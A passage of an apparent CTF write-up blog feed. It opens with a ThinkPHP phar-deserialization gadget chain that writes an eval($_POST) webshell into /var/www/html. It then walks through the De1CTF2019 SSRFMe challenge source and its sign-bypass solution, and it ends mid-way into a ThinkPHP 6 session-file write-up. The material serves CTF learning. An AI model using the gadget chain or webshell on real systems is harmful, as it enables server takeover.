class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Windows</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$files</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files = [<span class="variable">$files</span>]; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = <span class="variable">$output</span>; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;append = <span class="keyword">array</span>(<span class="string">&quot;xxx&quot;</span>=&gt;<span class="string">&quot;getError&quot;</span>);    </span><br><span class="line">            <span class="keyword">$this</span>-&gt;error = <span class="variable">$modelRelation</span>;   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::__construct(<span class="variable">$output</span>, <span class="variable">$modelRelation</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">HasOne</span> <span class="title">extends</span> <span class="title">OneToOne</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">OneToOne</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$query</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;query = <span class="variable">$query</span>;    <span class="comment">//$query指向Query</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">&#x27;xxx&#x27;</span>];<span class="comment">// $value值，作为call函数引用的第二变量</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Query</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$model</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;model = <span class="variable">$model</span>; <span class="comment">//$this-&gt;model=&gt; think\console\Output;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Output</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">handle</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle =<span class="variable">$handle</span>; <span class="comment">//$handle-&gt;think\session\driver\Memcached</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="variable">$handle</span>; <span class="comment">//$handle-&gt;think\cache\driver\File</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">File</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">options</span>=<span class="title">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options=[</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">3600</span>,</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>  =&gt; <span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../../../../../../../../../../var/www/html/&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tag = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">Memcached</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>(<span class="title">new</span> \<span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>());</span><br><span class="line">    <span class="variable">$Output</span> = <span class="keyword">new</span> think\console\Output(<span class="variable">$Memcached</span>);</span><br><span class="line">    <span class="variable">$model</span> = <span class="keyword">new</span> think\db\Query(<span class="variable">$Output</span>);</span><br><span class="line">    <span class="variable">$HasOne</span> = <span class="keyword">new</span> think\model\relation\HasOne(<span class="variable">$model</span>);</span><br><span class="line">    <span class="variable">$window</span> = <span class="keyword">new</span> think\process\pipes\Windows(<span class="keyword">new</span> think\model\Pivot(<span class="variable">$Output</span>,<span class="variable">$HasOne</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); </span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$window</span>);        </span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);        </span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;RCE-No-Para&quot;&gt;&lt;a href=&quot;#RCE-No-Para&quot; class=&quot;headerlink&quot; title=&quot;RCE_No_Para&quot;&gt;&lt;/a&gt;RCE_No_Para&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>De1CTF2019-SSRFMe</title>
    <link href="https://wuyusanhua2021.github.io/2022/01/10/De1CTF2019-SSRFMe/"/>
    <id>https://wuyusanhua2021.github.io/2022/01/10/De1CTF2019-SSRFMe/</id>
    <published>2022-01-10T06:41:03.000Z</published>
    <updated>2022-01-10T15:08:01.800Z</updated>
    
    <content type="html"><![CDATA[<p> 题目直接给出源码，是flask框架，进行审计，代码注释如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(self.sandbox):  <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> self.checkSign():</span><br><span class="line">            <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            当action包含scan时,若param不存在则令result[data]=param</span></span><br><span class="line"><span class="string">            若存在则将param写入./sandbox/result.txt</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> resp == <span class="string">&quot;Connection Timeout&quot;</span>:</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            当action包含read时,读取./sandbox/result的内容</span></span><br><span class="line"><span class="string">            作为result[data]的值</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="comment">#判断sign与getSign(action, param)是否相等</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> getSign(self.action, self.param) == self.sign:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">在/geneSign路由下,以get方式传入参数param,令action值为&#x27;scan&#x27;</span></span><br><span class="line"><span class="string">并调用getSign()函数进行处理</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">在/De1ta路由下,用get的方式传入参数action,sign,param,并对param进行waf过滤,ban掉了file和gopher协议</span></span><br><span class="line"><span class="string">通过过滤后创建一个task对象,然后返回其执行Exec()函数并json序列化后的内容，即序列化后的result数组</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> (waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断指定的param是否存在,是则返回param,否则返回报错</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#把secret_key,param,action拼接起来进行md5加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment">#将传入的content进行md5加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment">#以gopher或file开头(忽略大小写)的param返回true，反之返回false</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目还有额外hint:<code>flag is in ./flag.txt</code>，结合题目名称，思路应该就是用SSRF的方式得到flag.txt文件的内容</p><p>Task()类中的Exec()函数对文件的访问做出了规定，因为flag.txt是已经存在的文件，故action=scan时是无法直接将flag提取出来，但该函数在进行对action的判断时，并没有严格区分scan与read，而是使用<code>in</code>的方式进行判断，这样只要action同时有read和scan就可以同时进行文件写入和读取并赋值给result数组</p><p>/geneSign路由的作用是生成相应的sign，这里action已经被固定写为scan，故需传<code>flag.txtread</code>，得到sign</p><p><img src="/2022/01/10/De1CTF2019-SSRFMe/image-20220110230420074.png" alt="image-20220110230420074"></p><p>在/De1ta路由下抓包，并将之前得到的sign与param，action以get方式传递，页面就会返回flag</p><p><img src="/2022/01/10/De1CTF2019-SSRFMe/image-20220110230708047.png" alt="image-20220110230708047"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 题目直接给出源码，是flask框架，进行审计，代码注释如下：&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>GYCTF2020-EasyThinking-writeup</title>
    <link href="https://wuyusanhua2021.github.io/2022/01/06/GYCTF2020-EasyThinking/"/>
    <id>https://wuyusanhua2021.github.io/2022/01/06/GYCTF2020-EasyThinking/</id>
    <published>2022-01-06T09:36:30.000Z</published>
    <updated>2022-01-07T06:00:20.755Z</updated>
    
    <content type="html"><![CDATA[<p> thinkphp-v6.0.0框架漏洞+disable_functions绕过</p><p>打开题目是一个简易网站，目录扫描发现在 <code>www.zip</code> 有源码泄露，下载下来</p><p><img src="/2022/01/06/GYCTF2020-EasyThinking/.%5CGYCTF2020-EasyThinking%5Cimage-20220106175537402.png" alt="image-20220106175537402"></p><p>可以看出是thinkPHP框架搭建的，打个错误路径就能看到具体版本为6.0.0</p><p>谷歌6.0以上的thinkPHP漏洞，可以找到一个<a href="https://paper.seebug.org/1114/">thinkPHP6 session 任意文件操作漏洞</a></p><blockquote><p>2020年1月13号，<a href="https://www.uedbox.com/post/tag/thinkphp/">Thinkphp</a> 6.0.2发布，在详情页指出修复了一处<code>Session安全隐患</code>。经分析，该漏洞允许攻击者在目标环境启用session的条件下创建任意文件以及删除任意文件，在特定情况下还可以<a href="https://www.uedbox.com/post/tag/getshell/">getshell</a>。</p><p>具体受影响版本为ThinkPHP6.0.0-6.0.1。</p></blockquote><p>在源码app\home\controller路径下有Member.php文件，里面有一个关键函数search()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (Request::isPost())&#123;</span><br><span class="line">            <span class="keyword">if</span> (!session(<span class="string">&#x27;?UID&#x27;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> redirect(<span class="string">&#x27;/home/member/login&#x27;</span>);            </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$data</span> = input(<span class="string">&quot;post.&quot;</span>);</span><br><span class="line">            <span class="variable">$record</span> = session(<span class="string">&quot;Record&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!session(<span class="string">&quot;Record&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                session(<span class="string">&quot;Record&quot;</span>,<span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$recordArr</span> = explode(<span class="string">&quot;,&quot;</span>,<span class="variable">$record</span>);</span><br><span class="line">                <span class="variable">$recordLen</span> = sizeof(<span class="variable">$recordArr</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$recordLen</span> &gt;= <span class="number">3</span>)&#123;</span><br><span class="line">                    array_shift(<span class="variable">$recordArr</span>);</span><br><span class="line">                    session(<span class="string">&quot;Record&quot;</span>,implode(<span class="string">&quot;,&quot;</span>,<span class="variable">$recordArr</span>) . <span class="string">&quot;,&quot;</span> . <span class="variable">$data</span>[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">                    <span class="keyword">return</span> View::fetch(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            session(<span class="string">&quot;Record&quot;</span>,<span class="variable">$record</span> . <span class="string">&quot;,&quot;</span> . <span class="variable">$data</span>[<span 